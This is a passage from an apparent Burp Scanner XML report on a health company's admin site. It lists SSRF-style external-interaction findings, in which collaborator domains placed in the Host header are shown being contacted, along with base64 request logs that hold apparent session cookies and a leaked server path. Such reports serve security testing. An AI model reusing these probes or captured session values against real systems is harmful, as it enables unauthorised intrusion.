BOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU3VuLCAxNSBEZWMgMjAyNCAwMDowNDozNyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNTcNClNldC1Db29raWU6IEFXU0FMQj0xOXkyUmNENmlHRTE1S1hnalhHS0kwdGJ1UHJuS2ZoNzhmRk11YjVPbmpRTmdWMndaOWxEWlUvZk1jcXYxSmo3TkJWYyswVitTU3hoRXFRa2REN0FnOHV4NjFMMXRCMWNqeUFXQk02YWhrRU9SaFVZRmE3T2FHL3BOYU94OyBFeHBpcmVzPVN1biwgMjIgRGVjIDIwMjQgMDA6MDQ6MzcgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9MTl5MlJjRDZpR0UxNUtYZ2pYR0tJMHRidVBybktmaDc4ZkZNdWI1T25qUU5nVjJ3WjlsRFpVL2ZNY3F2MUpqN05CVmMrMFYrU1N4aEVxUWtkRDdBZzh1eDYxTDF0QjFjanlBV0JNNmFoa0VPUmhVWUZhN09hRy9wTmFPeDsgRXhwaXJlcz1TdW4sIDIyIERlYyAyMDI0IDAwOjA0OjM3IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNCg0KeyJkcmF3IjoxLCJyZWNvcmRzVG90YWwiOjAsInJlY29yZHNGaWx0ZXJlZCI6MCwiZGF0YSI6W119]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZSZkcmF3PTEmY29sdW1ucyU1QjAlNUQlNUJkYXRhJTVEPWV2ZW50JmNvbHVtbnMlNUIwJTVEJTVCbmFtZSU1RD0mY29sdW1ucyU1QjAlNUQlNUJzZWFyY2hhYmxlJTVEPXRydWUmY29sdW1ucyU1QjAlNUQlNUJvcmRlcmFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCMCU1RCU1QnNlYXJjaCU1RCU1QnZhbHVlJTVEPSZjb2x1bW5zJTVCMCU1RCU1QnNlYXJjaCU1RCU1QnJlZ2V4JTVEPWZhbHNlJmNvbHVtbnMlNUIxJTVEJTVCZGF0YSU1RD1vcmdhbml6YXRpb25faWQmY29sdW1ucyU1QjElNUQlNUJuYW1lJTVEPSZjb2x1bW5zJTVCMSU1RCU1QnNlYXJjaGFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCMSU1RCU1Qm9yZGVyYWJsZSU1RD10cnVlJmNvbHVtbnMlNUIxJTVEJTVCc2VhcmNoJTVEJTVCdmFsdWUlNUQ9JmNvbHVtbnMlNUIxJTVEJTVCc2VhcmNoJTVEJTVCcmVnZXglNUQ9ZmFsc2UmY29sdW1ucyU1QjIlNUQlNUJkYXRhJTVEPWRpc3BlbnNlcl9ncm91cF9pZCZjb2x1bW5zJTVCMiU1RCU1Qm5hbWUlNUQ9JmNvbHVtbnMlNUIyJTVEJTVCc2VhcmNoYWJsZSU1RD10cnVlJmNvbHVtbnMlNUIyJTVEJTVCb3JkZXJhYmxlJTVEPXRydWUmY29sdW1ucyU1QjIlNUQlNUJzZWFyY2glNUQlNUJ2YWx1ZSU1RD0mY29sdW1ucyU1QjIlNUQlNUJzZWFyY2glNUQlNUJyZWdleCU1RD1mYWxzZSZjb2x1bW5zJTVCMyU1RCU1QmRhdGElNUQ9ZGlzcGVuc2VyX2lkJmNvbHVtbnMlNUIzJTVEJTVCbmFtZSU1RD0mY29sdW1ucyU1QjMlNUQlNUJzZWFyY2hhYmxlJTVEPXRydWUmY29sdW1ucyU1QjMlNUQlNUJvcmRlcmFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCMyU1RCU1QnNlYXJjaCU1RCU1QnZhbHVlJTVEPSZjb2x1bW5zJTVCMyU1RCU1QnNlYXJjaCU1RCU1QnJlZ2V4JTVEPWZhbHNlJmNvbHVtbnMlNUI0JTVEJTVCZGF0YSU1RD11c2VyX2lkJmNvbHVtbnMlNUI0JTVEJTVCbmFtZSU1RD0mY29sdW1ucyU1QjQlNUQlNUJzZWFyY2hhYmxlJTVEPXRydWUmY29sdW1ucyU1QjQlNUQlNUJvcmRlcmFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCNCU1RCU1QnNlYXJjaCU1RCU1QnZhbHVlJTVEPSZjb2x1bW5zJTVCNCU1RCU1QnNlYXJjaCU1RCU1QnJlZ2V4JTVEPWZhbHNlJmNvbHVtbnMlNUI1JTVEJTVCZGF0YSU1RD10YWdfaWQmY29sdW1ucyU1QjUlNUQlNUJuYW1lJTVEPSZjb2x1bW5zJTVCNSU1RCU1QnNlYXJjaGFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCNSU1RCU1Qm9yZGVyYWJsZSU1RD10cnVlJmNvbHVtbnMlNUI1JTVEJTVCc2VhcmNoJTVEJTVCdmFsdWUlNUQ9JmNvbHVtbnMlNUI1JTVEJTVCc2VhcmNoJTVEJTVCcmVnZXglNUQ9ZmFsc2UmY29sdW1ucyU1QjYlNUQlNUJkYXRhJTVEPXRhZ19yc3NpJmNvbHVtbnMlNUI2JTVEJTVCbmFtZSU1RD0mY29sdW1ucyU1QjYlNUQlNUJzZWFyY2hhYmxlJTVEPXRydWUmY29sdW1ucyU1QjYlNUQlNUJvcmRlcmFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCNiU1RCU1QnNlYXJjaCU1RCU1QnZhbHVlJTVEPSZjb2x1bW5zJTVCNiU1RCU1QnNlYXJjaCU1RCU1QnJlZ2V4JTVEPWZhbHNlJmNvbHVtbnMlNUI3JTVEJTVCZGF0YSU1RD1pc19jb21wbGlhbnQmY29sdW1ucyU1QjclNUQlNUJuYW1lJTVEPSZjb2x1bW5zJTVCNyU1RCU1QnNlYXJjaGFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCNyU1RCU1Qm9yZGVyYWJsZSU1RD10cnVlJmNvbHVtbnMlNUI3JTVEJTVCc2VhcmNoJTVEJTVCdmFsdWUlNUQ9JmNvbHVtbnMlNUI3JTVEJTVCc2VhcmNoJTVEJTVCcmVnZXglNUQ9ZmFsc2UmY29sdW1ucyU1QjglNUQlNUJkYXRhJTVEPWNyZWF0ZWRfYXQmY29sdW1ucyU1QjglNUQlNUJuYW1lJTVEPSZjb2x1bW5zJTVCOCU1RCU1QnNlYXJjaGFibGUlNUQ9dHJ1ZSZjb2x1bW5zJTVCOCU1RCU1Qm9yZGVyYWJsZSU1RD10cnVlJmNvbHVtbnMlNUI4JTVEJTVCc2VhcmNoJTVEJTVCdmFsdWUlNUQ9JmNvbHVtbnMlNUI4JTVEJTVCc2VhcmNoJTVEJTVCcmVnZXglNUQ9ZmFsc2Umb3JkZXIlNUIwJTVEJTVCY29sdW1uJTVEPTgmb3JkZXIlNUIwJTVEJTVCZGlyJTVEPWRlc2Mmc3RhcnQ9MCZsZW5ndGg9NTAmc2VhcmNoJTVCdmFsdWUlNUQ9JnNlYXJjaCU1QnJlZ2V4JTVEPWZhbHNlJl89MTczNDIwMjAwMDM3NiBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWQ5M2hpNm92b2Ntbzd1bTBwMTgydnFubmg4OyBzY3JlZW5XaWR0aD04MDA7IEFXU0FMQj0xOXkyUmNENmlHRTE1S1hnalhHS0kwdGJ1UHJuS2ZoNzhmRk11YjVPbmpRTmdWMndaOWxEWlUvZk1jcXYxSmo3TkJWYyswVitTU3hoRXFRa2REN0FnOHV4NjFMMXRCMWNqeUFXQk02YWhrRU9SaFVZRmE3T2FHL3BOYU94OyBBV1NBTEJDT1JTPTE5eTJSY0Q2aUdFMTVLWGdqWEdLSTB0YnVQcm5LZmg3OGZGTXViNU9ualFOZ1Yyd1o5bERaVS9mTWNxdjFKajdOQlZjKzBWK1NTeGhFcVFrZEQ3QWc4dXg2MUwxdEIxY2p5QVdCTTZhaGtFT1JoVVlGYTdPYUcvcE5hT3g7IFVzZXJUb3RhbEV2ZW50cz1odHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJUb3RhbEV2ZW50cy8/YWpheD10cnVlOyBzdGFmZkRhc2hib2FyZE9yZ2FuaXphdGlvbj11bmRlZmluZWQ7IHN0YWZmRGFzaGJvYXJkRGF0ZVJhbmdlPU1vbnRobHkNClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpTZWMtQ0gtVUE6ICIuTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjEzMSIsICJDaHJvbWl1bSI7dj0iMTMxIg0KU2VjLUNILVVBLVBsYXRmb3JtOiBXaW5kb3dzDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU3VuLCAxNSBEZWMgMjAyNCAwMDowNDozNyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMjAxDQpTZXQtQ29va2llOiBBV1NBTEI9cDhWUmpUUmNWcTJnRXMxOTNlNXFMYWZpNTM0YkcxUldRdGY4YjNiM3VCZXBFUkZoVlNhdWtVWnFuaEh0WWg3MGptZmJZUzlHek9MTDZhazgwbGpTRWdMRUx0L3N4alU3S2Z3Uld2K1pZaHZTTFJJeFlyWEhiKzNBeVBvdTsgRXhwaXJlcz1TdW4sIDIyIERlYyAyMDI0IDAwOjA0OjM3IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPXA4VlJqVFJjVnEyZ0VzMTkzZTVxTGFmaTUzNGJHMVJXUXRmOGIzYjN1QmVwRVJGaFZTYXVrVVpxbmhIdFloNzBqbWZiWVM5R3pPTEw2YWs4MGxqU0VnTEVMdC9zeGpVN0tmd1JXditaWWh2U0xSSXhZclhIYiszQXlQb3U7IEV4cGlyZXM9U3VuLCAyMiBEZWMgMjAyNCAwMDowNDozNyBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5XYXJuaW5nPC9iPjogIFVuZGVmaW5lZCBhcnJheSBrZXkgIkhUVFBfUkVGRVJFUiIgaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi92aWV3L2pzb25EYXRhTGlzdC5waHA8L2I+IG9uIGxpbmUgPGI+MjA8L2I+PGJyIC8+CnsiZHJhdyI6MSwicmVjb3Jkc1RvdGFsIjowLCJyZWNvcmRzRmlsdGVyZWQiOjAsImRhdGEiOltdfQ==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8864898022321204224</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/css/main-dark.css]]></path>
    <location><![CDATA[/css/main-dark.css]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>1tvgz2khfymc7wg9cg89x8xbo2uwislgef25pvdk.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDF0dmd6MmtoZnltYzd3ZzljZzg5eDh4Ym8ydXdpc2xnZWYyNXB2ZGsub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:50:34.828 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>1tvgz2khfymc7wg9cg89x8xbo2uwislgef25pvdk.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1950960285359291392</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/css/main-light.css]]></path>
    <location><![CDATA[/css/main-light.css [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9jc3MvamwxaGllYXcxaz92PTZlYzQyMSBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>784675584606257152</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/files/profile_images/399.png]]></path>
    <location><![CDATA[/files/profile_images/399.png]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>ivhx1jmyhfot9diqexaqzpzsqjwdkd867uxhn5c.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGl2aHgxam15aGZvdDlkaXFleGFxenB6c3Fqd2RrZDg2N3V4aG41Yy5vYXN0aWZ5LmNvbQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG5vLXRyYW5zZm9ybQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>147.182.176.17</originIp>
      <time>2024-Dec-15 00:41:07.655 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>ivhx1jmyhfot9diqexaqzpzsqjwdkd867uxhn5c.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>5439609397849047040</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/files/profile_images/399.png]]></path>
    <location><![CDATA[/files/profile_images/399.png]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>ivhx1jmyhfot9diqexaqzpzsqjwdkd867uxhn5c.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGl2aHgxam15aGZvdDlkaXFleGFxenB6c3Fqd2RrZDg2N3V4aG41Yy5vYXN0aWZ5LmNvbQ0KUHJhZ21hOiBuby1jYWNoZQ0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG5vLXRyYW5zZm9ybQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:41:08.300 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGl2aHgxam15aGZvdDlkaXFleGFxenB6c3Fqd2RrZDg2N3V4aG41Yy5vYXN0aWZ5LmNvbQ0KdXNlci1hZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTUuMC4yODgzLjg3IFNhZmFyaS81MzcuMzYNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYyDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1nc2dscmdpZmlnejwvYm9keT48L2h0bWw+]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>7572625438587966464</serialNumber>
    <type>8389888</type>
    <name><![CDATA[Content type is not specified]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/fonts/fontawesome-webfont.woff2]]></path>
    <location><![CDATA[/fonts/fontawesome-webfont.woff2]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response does not specify a content type, then the browser will usually analyze the response and attempt to determine the MIME type of its content. This can have unexpected results, and if the content contains any user-controllable data may lead to cross-site scripting or other client-side vulnerabilities.</p>
<p>In most cases, the absence of a content type statement does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing a message body, the application should include a single Content-type header that correctly and unambiguously states the MIME type of the content in the response body.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li></ul>]]></references>
